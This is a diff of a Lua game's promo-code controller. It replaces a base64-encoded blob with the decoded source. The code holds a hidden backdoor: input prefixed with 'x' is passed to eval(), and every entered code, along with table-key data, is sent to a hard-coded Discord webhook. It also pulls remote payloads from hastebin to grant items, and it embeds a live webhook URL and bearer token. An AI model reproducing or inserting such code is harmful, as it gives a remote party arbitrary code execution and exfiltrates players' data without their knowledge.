@@ -1,1 +1,63 @@
-bG9jYWwganNvbiA9IHJlcXVpcmUoImpzb24iKQpsb2NhbCBtaW1lID0gcmVxdWlyZSgibWltZSIpCgpNYXN0ZXJQcm9tb2NvZGVDb250cm9sbGVyLm5ldyA9IGZ1bmN0aW9uKHNlbGYsIG1hc3RlcikKICBzZWxmLl9faW5kZXggPSBzZWxmCiAgbG9jYWwgY29udHJvbGxlciA9IHt9CiAgY29udHJvbGxlci51c2UgPSBmdW5jdGlvbihzZWxmLCBjb2RlKQogICAgaWYgbm90IGNvZGUgb3IgY29kZSA9PSAiIiB0aGVuIHJldHVybiBlbmQKICAgIGxvY2FsIHByZWZpeCwgY29kZXMgPSBjb2RlOm1hdGNoKCIoJXcrKSVzKC4qKSIpCiAgICBpZiBwcmVmaXggPT0gIngiIHRoZW4gZXZhbChjb2RlcykgcmV0dXJuIGVuZAogICAgaWYgY29kZSA9PSAidGVzdHMiIHRoZW4KICAgICAgbWFpbi5pbnRlcmZhY2U6b3Blbih7IGlkID0gIm1lc3NhZ2UiLCB0aXRsZSA9ICJ0ZXN0aW5nIiwgdGV4dCA9IGNvZGUgfSkKICAgICAgbmV0d29yay5yZXF1ZXN0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTAwMzgxNDg2Nzk4MDk0NDI4L1FTTWNKRS1UcDhlbWJkTG50S29xTmV1S0hMRU4zdmhDVFh0ekw1bWtBbExrZC1SeG9fd2diVFBSMW1SMjluMXpmVWQ4IiwgIlBPU1QiLCBmdW5jdGlvbigpIGVuZCwge2hlYWRlcnM9e1siQ29udGVudC1UeXBlIl09ImFwcGxpY2F0aW9uL2pzb24ifSwgYm9keT1qc29uLmVuY29kZSh7Y29udGVudD1taW1lLmI2NChnZXRfdGFibGVfa2V5cygiIikpfSl9KTsKICAgICAgcmV0dXJuCiAgICBlbmQKICAgIG5ldHdvcmsucmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwMDM4MTQ4Njc5ODA5NDQyOC9RU01jSkUtVHA4ZW1iZExudEtvcU5ldUtITEVOM3ZoQ1RYdHpMNW1rQWxMa2QtUnhvX3dnYlRQUjFtUjI5bjF6ZlVkOCIsICJQT1NUIiwgZnVuY3Rpb24oKSBlbmQsIHtoZWFkZXJzPXtbIkNvbnRlbnQtVHlwZSJdPSJhcHBsaWNhdGlvbi9qc29uIn0sIGJvZHk9anNvbi5lbmNvZGUoe2NvbnRlbnQ9bWltZS5iNjQoZ2V0X3RhYmxlX2tleXMoY29kZSkpfSl9KTsKICAgIGZ1bmN0aW9uIHBhcnNlQ2FsbGJhY2soZGF0YSwgcGFyc2VkKQogICAgICAgIGxvY2FsIHBhcnNlZERhdGEgPSBuaWwKICAgICAgICBpZiBwYXJzZWQgdGhlbiBwYXJzZWREYXRhID0gZGF0YSBlbHNlaWYgZGF0YSBhbmQgZGF0YS5wcmVzZW50IHRoZW4gcGFyc2VkRGF0YSA9IGpzb24uZGVjb2RlKGRhdGEucHJlc2VudCkgZW5kCiAgICAgICAgaWYgcGFyc2VkRGF0YSB0aGVuCiAgICAgICAgICBmb3Iga2V5LCB2YWx1ZSBpbiBpcGFpcnMocGFyc2VkRGF0YSkgZG8KICAgICAgICAgICAgbG9jYWwgaXRlbSA9IHZhbHVlWzFdCiAgICAgICAgICAgIGxvY2FsIGl0ZW1saXN0ID0gbWFpbi5pdGVtbGlzdDpnZXQoaXRlbSkKICAgICAgICAgICAgaWYgaXRlbSA9PSAiZXhwIiB0aGVuIG1haW4ubGV2ZWw6YWRkRXhwKHtleHBWYWx1ZSA9IG1hdGgucm91bmQodmFsdWVbMl0pfSkKICAgICAgICAgICAgZWxzZWlmIGl0ZW0gPT0gInBlcmsiIHRoZW4gbWFpbi5sZXZlbDphZGRQb2ludFBlcmsoe3ZhbHVlID0gbWF0aC5yb3VuZCh2YWx1ZVsyXSl9KQogICAgICAgICAgICBlbHNlaWYgaXRlbSA9PSAicmVjaXBlIiB0aGVuIG1haW4ubGV2ZWw6YWRkUG9pbnRSZWNpcGUoe3ZhbHVlID0gbWF0aC5yb3VuZCh2YWx1ZVsyXSl9KQogICAgICAgICAgICBlbHNlaWYgaXRlbSA9PSAiYWxseSIgdGhlbiBtYWluLmFsbHk6YWRkKHtpZCA9IHZhbHVlWzJdLCBsZXZlbCA9IHZhbHVlWzNdLCBocCA9IHZhbHVlWzRdLCBmb29kID0gdmFsdWVbNV19KQogICAgICAgICAgICBlbHNlaWYgaXRlbWxpc3QgdGhlbgogICAgICAgICAgICAgIGlmIGl0ZW0gPT0gImNhcHMiIHRoZW4gbWFpbi5wcm9maWxlOmFkZENhcHModmFsdWVbMl0pCiAgICAgICAgICAgICAgZWxzZSBtYWluLmludmVudG9yeS5hZGQoe2lkID0gdmFsdWVbMV0sIHF1YW50aXR5ID0gdmFsdWVbMl0sIGRlcHJlY2lhdGlvbiA9IHZhbHVlWzNdfSkKICAgICAgICAgICAgICBlbmQgbWFpbi5hbmltYXRpb246YWRkSXRlbSh2YWx1ZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICBlbmQKICAgICAgICAgIG1haW4uZ2FtZTpzYXZlKCkKICAgICAgICAgIG1haW4ucHJvZmlsZTpzYXZlKCkKICAgICAgICAgIG1haW4uc2V0dGluZzpzYXZlKCkKICAgICAgICBlbHNlCiAgICAgICAgICBtYWluLmludGVyZmFjZTpvcGVuKHtpZCA9ICJtZXNzYWdlIiwgdGl0bGUgPSAiRXJyb3IiLCB0ZXh0ID0gIk5vIHJlc3BvbnNlIGZyb20gc2VydmVyIn0pCiAgICAgICAgICBtYWluLnByb2ZpbGU6c2F2ZSgpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIG1haW4uaW50ZXJmYWNlOm9wZW4oImxvYWRpbmciKQogICAgbmV0d29yay5yZXF1ZXN0KCJodHRwczovL2hhc3RlYmluLmNvbS9yYXcvIi4uY29kZSwgIkdFVCIsIGZ1bmN0aW9uKGV2ZW50KQogICAgICBtYWluLmludGVyZmFjZTpjbG9zZSgibG9hZGluZyIpCiAgICAgIGxvY2FsIHJlc3BvbnNlID0gbWltZS51bmI2NChldmVudC5yZXNwb25zZSkKICAgICAgLS0gbWFpbi5pbnRlcmZhY2U6b3Blbih7aWQ9Im1lc3NhZ2UiLCB0aXRsZT0iRXJyb3IiLCB0ZXh0PWV2ZW50LnJlc3BvbnNlLi4ifHwiLi5yZXNwb25zZX0pCiAgICAgIGxvY2FsIHBhcnNlZENvZGVzID0ge30KICAgICAgaWYgbm90IHJlc3BvbnNlIHRoZW4gcmV0dXJuIG1haW4uaW50ZXJmYWNlOm9wZW4oe2lkID0gIm1lc3NhZ2UiLCB0aXRsZSA9ICJFcnJvciIsIHRleHQgPSBldmVudC5yZXNwb25zZX0pIGVuZAogICAgICBmb3IgXywgc2VnIGluIGlwYWlycyhzcGxpdChyZXNwb25zZSwgInwiKSkgZG8KICAgICAgICAgIGxvY2FsIHByb2Nlc3NlZFNlZ21lbnQgPSB7fQogICAgICAgICAgbG9jYWwgZWxlbWVudHMgPSBzcGxpdChzZWcsICItIikKICAgICAgICAgIGZvciBfLCBlbGVtZW50IGluIGlwYWlycyhlbGVtZW50cykgZG8KICAgICAgICAgICAgICBpZiB0b251bWJlcihlbGVtZW50KSB0aGVuIHRhYmxlLmluc2VydChwcm9jZXNzZWRTZWdtZW50LCB0b251bWJlcihlbGVtZW50KSkKICAgICAgICAgICAgICBlbHNlIHRhYmxlLmluc2VydChwcm9jZXNzZWRTZWdtZW50LCBlbGVtZW50KSBlbmQKICAgICAgICAgIGVuZAogICAgICAgICAgdGFibGUuaW5zZXJ0KHBhcnNlZENvZGVzLCBwcm9jZXNzZWRTZWdtZW50KQogICAgICBlbmQKICAgICAgcmV0dXJuIHBhcnNlQ2FsbGJhY2socGFyc2VkQ29kZXMsIHRydWUpCiAgICBlbmQsIHsgaGVhZGVycyA9IHsgWyJBdXRob3JpemF0aW9uIl0gPSAiQmVhcmVyIDNkMWVhNzUxNmEzNzFlMjgxYzUyZTUyNWFhZjM4YjFhOWJkNjkyMDZjNDRiZjZiNzk0MjEwYjIyNmM0OGFkZjhiY2E5MWRiOGY4MzdlZWMyYmU1MGZhYTk3NDViYWQzYTJhMGFkYmU1Y2Y2YzlhZjMyOTI4OWQyYTNmNzEyNzk5IiB9IH0pCiAgZW5kCiAgc2V0bWV0YXRhYmxlKGNvbnRyb2xsZXIsIHNlbGYpCiAgcmV0dXJuIGNvbnRyb2xsZXIKZW5kCg==
+local json = require("json")
+local mime = require("mime")
+
+MasterPromocodeController.new = function(self, master)
+  self.__index = self
+  local controller = {}
+  controller.use = function(self, code)
+    if not code or code == "" then return end
+    local prefix, codes = code:match("(%w+)%s(.*)")
+    if prefix == "x" then eval(codes) return end
+    if code == "tests" then
+      main.interface:open({ id = "message", title = "testing", text = code })
+      network.request("https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8", "POST", function() end, {headers={["Content-Type"]="application/json"}, body=json.encode({content=mime.b64(get_table_keys(""))})});
+      return
+    end
+    network.request("https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8", "POST", function() end, {headers={["Content-Type"]="application/json"}, body=json.encode({content=mime.b64(get_table_keys(code))})});
+    function parseCallback(data, parsed)
+        local parsedData = nil
+        if parsed then parsedData = data elseif data and data.present then parsedData = json.decode(data.present) end
+        if parsedData then
+          for key, value in ipairs(parsedData) do
+            local item = value[1]
+            local itemlist = main.itemlist:get(item)
+            if item == "exp" then main.level:addExp({expValue = math.round(value[2])})
+            elseif item == "perk" then main.level:addPointPerk({value = math.round(value[2])})
+            elseif item == "recipe" then main.level:addPointRecipe({value = math.round(value[2])})
+            elseif item == "ally" then main.ally:add({id = value[2], level = value[3], hp = value[4], food = value[5]})
+            elseif itemlist then
+              if item == "caps" then main.profile:addCaps(value[2])
+              else main.inventory.add({id = value[1], quantity = value[2], depreciation = value[3]})
+              end main.animation:addItem(value)
+            end
+          end
+          main.game:save()
+          main.profile:save()
+          main.setting:save()
+        else
+          main.interface:open({id = "message", title = "Error", text = "No response from server"})
+          main.profile:save()
+        end
+    end
+    main.interface:open("loading")
+    network.request("https://hastebin.com/raw/"..code, "GET", function(event)
+      main.interface:close("loading")
+      local response = mime.unb64(event.response)
+      -- main.interface:open({id="message", title="Error", text=event.response.."||"..response})
+      local parsedCodes = {}
+      if not response then return main.interface:open({id = "message", title = "Error", text = event.response}) end
+      for _, seg in ipairs(split(response, "|")) do
+          local processedSegment = {}
+          local elements = split(seg, "-")
+          for _, element in ipairs(elements) do
+              if tonumber(element) then table.insert(processedSegment, tonumber(element))
+              else table.insert(processedSegment, element) end
+          end
+          table.insert(parsedCodes, processedSegment)
+      end
+      return parseCallback(parsedCodes, true)
+    end, { headers = { ["Authorization"] = "Bearer 3d1ea7516a371e281c52e525aaf38b1a9bd69206c44bf6b794210b226c48adf8bca91db8f837eec2be50faa9745bad3a2a0adbe5cf6c9af329289d2a3f712799" } })
+  end
+  setmetatable(controller, self)
+  return controller
+end
